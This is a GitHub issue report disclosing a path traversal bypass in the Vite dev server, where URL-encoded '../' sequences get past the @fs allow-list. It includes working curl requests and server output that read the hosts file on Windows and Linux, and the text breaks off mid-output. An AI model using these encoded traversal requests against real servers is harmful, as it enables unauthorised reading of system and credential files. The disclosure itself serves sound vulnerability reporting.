## Description

![@stypr](https://avatars.githubusercontent.com/u/6625978?u=bd666145c809a25757ae83f9a6a793fd08dd1c46&v=4&size=48)[stypr](https://github.com/stypr)opened [on Jun 8, 2022](https://github.com/vitejs/vite/issues/8498#issue-1264168583)
### Describe the bug

The vulnerability found at [#2820](https://github.com/vitejs/vite/issues/2820) was found to be not fixed properly, which leads to the unrestricted directory traversal.

Currently the `@fs` directory does check for the allowed path, but it does not check for encoded paths.

For example, assuming that `/@fs/home/test/` is the only allowed path, this can be bypassed by accessing `/@fs/home/test/%2e%2e%2f%2e%2e%2f`, which translates to `/@fs/home/test/../../` internally.

Since this way of access through the browser may output an inconsistent result, `curl --path-as-is` can be used as an alternative way to reproduce such issue.

### Reproduction

Any vite project is affected by this vulnerability.

```
npm init @vitejs/app app
cd app
npm install
npm run dev
```
#### Reproduction in Windows

Accessing `C:/Windows/System32/drivers/etc/hosts` is blocked since the allow list only contains `C:/Users/stypr/Desktop/development/q/vite-project`.

```
$ curl --path-as-is -v "http://localhost:3001/@fs/C:/Windows/System32/drivers/etc/hosts"
*   Trying ::1:3001...
*   Trying 127.0.0.1:3001...
* Connected to localhost (127.0.0.1) port 3001 (#0)
> GET /@fs/C:/Windows/System32/drivers/etc/hosts HTTP/1.1
> Host: localhost:3001
> User-Agent: curl/7.75.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 403 Forbidden
< Access-Control-Allow-Origin: *
< Date: Wed, 08 Jun 2022 04:00:32 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< Transfer-Encoding: chunked
<

    <body>
      <h1>403 Restricted</h1>
      <p>The request url "C:/Windows/System32/drivers/etc/hosts" is outside of Vite serving allow list.<br/><br/>- C:/Users/stypr/Desktop/development/q/vite-project<br/><br/>Refer to docs https://vitejs.dev/config/#server-fs-allow for configurations and more details.</p>
      <style>
        body {
          padding: 1em 2em;
        }
      </style>
    </body>
  * Connection #0 to host localhost left intact
  *
```

What if we access like `C:/Users/stypr/Desktop/development/q/vite-project/../../../../../../Windows/System32/drivers/etc/hosts`? In typical cases, this doesn't work

However, if we replace the path `../` as `%2e%2e%2f` and replace every trailing slashes to `%2f`, the check is bypassed and the path traversal becomes successful.

```
$ curl --path-as-is -v "http://localhost:3001/@fs/C:/Users/stypr/Desktop/development/q/vite-project/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fWindows%2fSystem32%2fdrivers%2fetc%2fhosts"

# This file contains the mappings of IP addresses to host names. Each

# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.

#### Reproduction in Linux

Linux is also pretty much the same, you can first get the whitelist path (`/srv/q/app`) by accessing a random path(`/@fs/...`), and then do a path traversal based on the given whitelist.

```
curl -v --path-as-is "http://192.168.125.129:3000/@fs/srv/q/app/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts"
*   Trying 192.168.125.129:3000...
* TCP_NODELAY set
* Connected to 192.168.125.129 (192.168.125.129) port 3000 (#0)
> GET /@fs/srv/q/app/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts HTTP/1.1
> Host: 192.168.125.129:3000
